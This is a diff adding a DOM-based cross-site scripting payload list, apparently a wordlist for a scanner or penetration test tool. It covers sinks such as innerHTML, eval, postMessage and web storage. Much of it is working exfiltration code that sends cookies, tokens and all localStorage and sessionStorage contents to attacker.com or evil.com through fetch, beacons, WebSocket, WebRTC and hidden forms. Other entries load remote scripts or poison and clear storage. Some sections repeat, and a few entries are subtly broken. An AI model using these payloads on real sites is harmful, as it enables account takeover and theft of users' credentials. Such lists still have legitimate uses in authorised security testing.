@@ -1,0 +1,466 @@
+# DOM-based XSS Payloads
+# These payloads target common DOM sinks
+
+# location/location.href based
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript:alert(document.cookie)
+javascript:fetch('//evil.com?cookie='+document.cookie)
+javascript:eval(atob('YWxlcnQoMSk='))
+javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+javascript:void(alert(1))
+javascript:void(alert(document.domain))
+javascript:void(alert(document.cookie))
+
+# document.write based
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>document.write('<svg onload=alert(1)>')</script>
+<script>document.write('<iframe src=javascript:alert(1)>')</script>
+<script>document.write(decodeURIComponent('%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E'))</script>
+<script>document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62))</script>
+<script>document.write(atob('PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='))</script>
+
+# document.writeln based
+<script>document.writeln('<img src=x onerror=alert(1)>')</script>
+<script>document.writeln('<svg onload=alert(1)>')</script>
+<script>document.writeln('<iframe src=javascript:alert(1)>')</script>
+<script>document.writeln(decodeURIComponent('%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E'))</script>
+<script>document.writeln(String.fromCharCode(60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62))</script>
+<script>document.writeln(atob('PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='))</script>
+
+# innerHTML based
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(document.domain)>
+<svg onload=alert(document.cookie)>
+<iframe src=javascript:alert(document.domain)>
+<iframe src=javascript:alert(document.cookie)>
+
+# outerHTML based
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(document.domain)>
+<svg onload=alert(document.cookie)>
+<iframe src=javascript:alert(document.domain)>
+<iframe src=javascript:alert(document.cookie)>
+
+# insertAdjacentHTML based
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<script>alert(1)</script>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(document.domain)>
+<svg onload=alert(document.cookie)>
+<iframe src=javascript:alert(document.domain)>
+<iframe src=javascript:alert(document.cookie)>
+
+# eval based
+alert(1)
+alert(document.domain)
+alert(document.cookie)
+fetch('//evil.com?cookie='+document.cookie)
+(function(){var x=document.createElement('script');x.src='//evil.com/xss.js';document.head.appendChild(x)})()
+(function(){var x=document.createElement('img');x.src='x';x.onerror=alert;x.onerror(1)})()
+(function(){var x=document.createElement('iframe');x.src='javascript:alert(1)';document.body.appendChild(x)})()
+
+# setTimeout/setInterval based
+alert(1)
+alert(document.domain)
+alert(document.cookie)
+fetch('//evil.com?cookie='+document.cookie)
+(function(){var x=document.createElement('script');x.src='//evil.com/xss.js';document.head.appendChild(x)})()
+(function(){var x=document.createElement('img');x.src='x';x.onerror=alert;x.onerror(1)})()
+(function(){var x=document.createElement('iframe');x.src='javascript:alert(1)';document.body.appendChild(x)})()
+
+# Function constructor based
+alert(1)
+alert(document.domain)
+alert(document.cookie)
+fetch('//evil.com?cookie='+document.cookie)
+(function(){var x=document.createElement('script');x.src='//evil.com/xss.js';document.head.appendChild(x)})()
+(function(){var x=document.createElement('img');x.src='x';x.onerror=alert;x.onerror(1)})()
+(function(){var x=document.createElement('iframe');x.src='javascript:alert(1)';document.body.appendChild(x)})()
+
+# URL fragment based (for location.hash sinks)
+#<img src=x onerror=alert(1)>
+#<svg onload=alert(1)>
+#<iframe src=javascript:alert(1)>
+#<script>alert(1)</script>
+#<img src=x onerror=alert(document.domain)>
+#<img src=x onerror=alert(document.cookie)>
+#<svg onload=alert(document.domain)>
+#<svg onload=alert(document.cookie)>
+#<iframe src=javascript:alert(document.domain)>
+#<iframe src=javascript:alert(document.cookie)>
+
+# URL query based (for location.search sinks)
+?xss=<img src=x onerror=alert(1)>
+?xss=<svg onload=alert(1)>
+?xss=<iframe src=javascript:alert(1)>
+?xss=<script>alert(1)</script>
+?xss=<img src=x onerror=alert(document.domain)>
+?xss=<img src=x onerror=alert(document.cookie)>
+?xss=<svg onload=alert(document.domain)>
+?xss=<svg onload=alert(document.cookie)>
+?xss=<iframe src=javascript:alert(document.domain)>
+?xss=<iframe src=javascript:alert(document.cookie)>
+
+# postMessage based
+<script>
+window.addEventListener('message', function(e) {
+  eval(e.data);
+});
+</script>
+
+<script>
+window.addEventListener('message', function(e) {
+  document.write(e.data);
+});
+</script>
+
+<script>
+window.addEventListener('message', function(e) {
+  document.body.innerHTML = e.data;
+});
+</script>
+
+<script>
+window.addEventListener('message', function(e) {
+  var script = document.createElement('script');
+  script.text = e.data;
+  document.body.appendChild(script);
+});
+</script>
+
+# localStorage/sessionStorage based
+<script>
+eval(localStorage.getItem('xss'));
+</script>
+
+<script>
+document.write(localStorage.getItem('xss'));
+</script>
+
+<script>
+document.body.innerHTML = localStorage.getItem('xss');
+</script>
+
+<script>
+eval(sessionStorage.getItem('xss'));
+</script>
+
+<script>
+document.write(sessionStorage.getItem('xss'));
+</script>
+
+<script>
+document.body.innerHTML = sessionStorage.getItem('xss');
+</script>
+
+# document.domain based
+<script>
+document.domain = 'attacker.com';
+</script>
+
+# document.referrer based
+<script>
+var referrer = document.referrer;
+eval(referrer.substring(referrer.indexOf('xss=')+4));
+</script>
+
+<script>
+var referrer = document.referrer;
+document.write(referrer.substring(referrer.indexOf('xss=')+4));
+</script>
+
+<script>
+var referrer = document.referrer;
+document.body.innerHTML = referrer.substring(referrer.indexOf('xss=')+4);
+</script>
+
+# window.name based
+<script>
+eval(window.name);
+</script>
+
+<script>
+document.write(window.name);
+</script>
+
+<script>
+document.body.innerHTML = window.name;
+</script>
+
+# Advanced localStorage/sessionStorage based Payloads
+<script>
+// Basic data exfiltration
+fetch('http://attacker.com/steal?data='+localStorage.getItem('sensitive_data'));
+fetch('http://attacker.com/steal?data='+sessionStorage.getItem('sensitive_data'));
+
+// Using Image objects
+new Image().src='http://attacker.com/steal?data='+localStorage.getItem('sensitive_data');
+new Image().src='http://attacker.com/steal?data='+sessionStorage.getItem('sensitive_data');
+
+// Using Beacon API
+navigator.sendBeacon('http://attacker.com/steal', localStorage.getItem('sensitive_data'));
+navigator.sendBeacon('http://attacker.com/steal', sessionStorage.getItem('sensitive_data'));
+
+// Using WebSocket
+var ws = new WebSocket('ws://attacker.com');
+ws.onopen = function() {
+    ws.send(localStorage.getItem('sensitive_data'));
+    ws.send(sessionStorage.getItem('sensitive_data'));
+}
+
+// Using XMLHttpRequest
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://attacker.com/steal?data='+localStorage.getItem('sensitive_data'));
+xhr.send();
+
+// Stealing all storage data
+var data = {};
+for(var i=0; i<localStorage.length; i++) {
+    var key = localStorage.key(i);
+    data[key] = localStorage.getItem(key);
+}
+fetch('http://attacker.com/steal?data='+JSON.stringify(data));
+
+// Session storage dump
+var sessionData = {};
+for(var i=0; i<sessionStorage.length; i++) {
+    var key = sessionStorage.key(i);
+    sessionData[key] = sessionStorage.getItem(key);
+}
+fetch('http://attacker.com/steal?data='+JSON.stringify(sessionData));
+
+// Using jQuery if available
+if(typeof $ !== 'undefined') {
+    $.get('http://attacker.com/steal', {data: localStorage.getItem('sensitive_data')});
+    $.post('http://attacker.com/steal', {data: sessionStorage.getItem('sensitive_data')});
+}
+
+// Using Fetch API with different methods
+fetch('http://attacker.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({
+        localStorage: localStorage.getItem('sensitive_data'),
+        sessionStorage: sessionStorage.getItem('sensitive_data')
+    })
+});
+
+// Using async/await
+(async function() {
+    const data = {
+        localStorage: localStorage.getItem('sensitive_data'),
+        sessionStorage: sessionStorage.getItem('sensitive_data')
+    };
+    await fetch('http://attacker.com/steal', {
+        method: 'POST',
+        body: JSON.stringify(data)
+    });
+})();
+
+// Periodic exfiltration
+setInterval(function() {
+    fetch('http://attacker.com/steal?data='+localStorage.getItem('sensitive_data'));
+}, 5000);
+
+// Storage event listener
+window.addEventListener('storage', function(e) {
+    fetch('http://attacker.com/steal', {
+        method: 'POST',
+        body: JSON.stringify({
+            key: e.key,
+            oldValue: e.oldValue,
+            newValue: e.newValue,
+            url: e.url
+        })
+    });
+});
+
+// Stealing specific keys
+const sensitiveKeys = ['token', 'auth', 'session', 'jwt', 'key', 'api', 'secret', 'credentials'];
+const stolenData = {};
+
+sensitiveKeys.forEach(key => {
+    const localValue = localStorage.getItem(key);
+    const sessionValue = sessionStorage.getItem(key);
+    if(localValue) stolenData[`local_${key}`] = localValue;
+    if(sessionValue) stolenData[`session_${key}`] = sessionValue;
+});
+
+fetch('http://attacker.com/steal', {
+    method: 'POST',
+    body: JSON.stringify(stolenData)
+});
+
+// Base64 encoded exfiltration
+fetch('http://attacker.com/steal?data='+btoa(localStorage.getItem('sensitive_data')));
+fetch('http://attacker.com/steal?data='+btoa(sessionStorage.getItem('sensitive_data')));
+
+// Using WebRTC for data exfiltration
+const pc = new RTCPeerConnection();
+pc.createDataChannel('storage').send(JSON.stringify({
+    localStorage: localStorage.getItem('sensitive_data'),
+    sessionStorage: sessionStorage.getItem('sensitive_data')
+}));
+
+// Using form submission
+const form = document.createElement('form');
+form.action = 'http://attacker.com/steal';
+form.method = 'POST';
+
+const input = document.createElement('input');
+input.type = 'hidden';
+input.name = 'data';
+input.value = JSON.stringify({
+    localStorage: localStorage.getItem('sensitive_data'),
+    sessionStorage: sessionStorage.getItem('sensitive_data')
+});
+
+form.appendChild(input);
+document.body.appendChild(form);
+form.submit();
+</script>
+
+
+# Advanced DOM-based XSS Payloads (2025 Edition)
+# location/location.href based
+javascript:alert(1)
+javascript:fetch('//evil.com?cookie='+document.cookie)
+javascript:eval(atob('YWxlcnQoMSk='))
+
+# document.write based
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>document.write('<svg onload=alert(1)>')</script>
+<script>document.write('<iframe src=javascript:alert(1)>')</script>
+<script>document.write(atob('PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='))</script>
+
+# innerHTML/outerHTML/insertAdjacentHTML
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<script>alert(1)</script>
+
+# eval/setTimeout/setInterval/Function
+alert(1)
+fetch('//evil.com?cookie='+document.cookie)
+(function(){var x=document.createElement('script');x.src='//evil.com/xss.js';document.head.appendChild(x)})()
+
+# Function constructor
+alert(1)
+fetch('//evil.com?cookie='+document.cookie)
+
+# URL fragment based (for location.hash sinks)
+#<img src=x onerror=alert(1)>
+#<svg onload=alert(1)>
+#<iframe src=javascript:alert(1)>
+#<script>alert(1)</script>
+
+# insertAdjacentHTML
+<img src=x onerror=alert(document.domain)>
+
+# Web Messaging
+window.addEventListener('message',function(e){eval(e.data)});
+
+# Clipboard API
+navigator.clipboard.writeText('javascript:alert(1)').then(() => navigator.clipboard.readText().then(eval));
+
+# WebRTC
+const pc = new RTCPeerConnection();pc.createDataChannel('storage').send(JSON.stringify({xss:1}));
+
+# MutationObserver
+new MutationObserver(()=>alert(1)).observe(document,{childList:true,subtree:true});
+
+# IntersectionObserver
+new IntersectionObserver(()=>alert(1)).observe(document.body);
+
+# BroadcastChannel
+new BroadcastChannel('xss').postMessage('<img src=x onerror=alert(1)>');
+
+# Polyglot
+<svg><g/onload=alert(1)//<p>
+
+# More advanced payloads in custom_payloads/dom-xss.txt
+
+# Storage Manipulation Payloads
+<script>
+// Overwriting storage data
+localStorage.setItem('sensitive_data', 'compromised');
+sessionStorage.setItem('sensitive_data', 'compromised');
+
+// Clearing storage
+localStorage.clear();
+sessionStorage.clear();
+
+// Modifying specific items
+localStorage.removeItem('auth_token');
+sessionStorage.removeItem('session_id');
+
+// Poisoning storage data
+localStorage.setItem('auth_token', localStorage.getItem('auth_token') + '_compromised');
+sessionStorage.setItem('session_id', sessionStorage.getItem('session_id') + '_compromised');
+
+// Storage enumeration and manipulation
+Object.keys(localStorage).forEach(key => {
+    const value = localStorage.getItem(key);
+    localStorage.setItem(key, 'compromised_' + value);
+    fetch('http://attacker.com/steal', {
+        method: 'POST',
+        body: JSON.stringify({key, value})
+    });
+});
+</script>
+
+# Combined Storage and DOM Manipulation
+<script>
+// Injecting malicious content from storage
+document.body.innerHTML = localStorage.getItem('content');
+document.body.innerHTML = sessionStorage.getItem('content');
+
+// Executing stored JavaScript
+eval(localStorage.getItem('code'));
+eval(sessionStorage.getItem('code'));
+
+// Storing and executing malicious scripts
+localStorage.setItem('evil_script', 'alert(document.cookie)');
+eval(localStorage.getItem('evil_script'));
+
+// DOM-based XSS via storage
+document.write(localStorage.getItem('html_content'));
+document.write(sessionStorage.getItem('html_content'));
+
+// Iframe injection via storage
+document.body.innerHTML = `<iframe src="${localStorage.getItem('iframe_src')}">`;
+
+// Script tag injection via storage
+document.body.innerHTML = `<script src="${localStorage.getItem('script_src')}">`;
+
+// Creating persistent XSS
+localStorage.setItem('autorun_script', '<script>alert(document.cookie)</script>');
+document.write(localStorage.getItem('autorun_script'));
+</script> 
+
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<script>document.write('<svg onload=alert(1)>')</script>
+<script>document.body.appendChild(document.createElement('script')).src='http://evil.com/xss.js'</script>
+<script>localStorage.setItem('xss','<img src=x onerror=alert(1)>');document.body.innerHTML=localStorage.getItem('xss');</script>
+<script>sessionStorage.setItem('xss','<svg onload=alert(1)>');document.body.innerHTML=sessionStorage.getItem('xss');</script>
+<script>location.hash='#<img src=x onerror=alert(1)>'</script>
+<script>eval(location.hash.substring(1))</script>
+<script>window.postMessage('<img src=x onerror=alert(1)>','*')</script>
+<script>window.addEventListener('message',e=>eval(e.data))</script>
+<form id="test"></form><script>alert(test)</script>
+<img src="x" id="test"/><script>alert(test.id)</script>
+<a id="test" href="javascript:alert(1)">click</a>
+<script>test.click()</script>
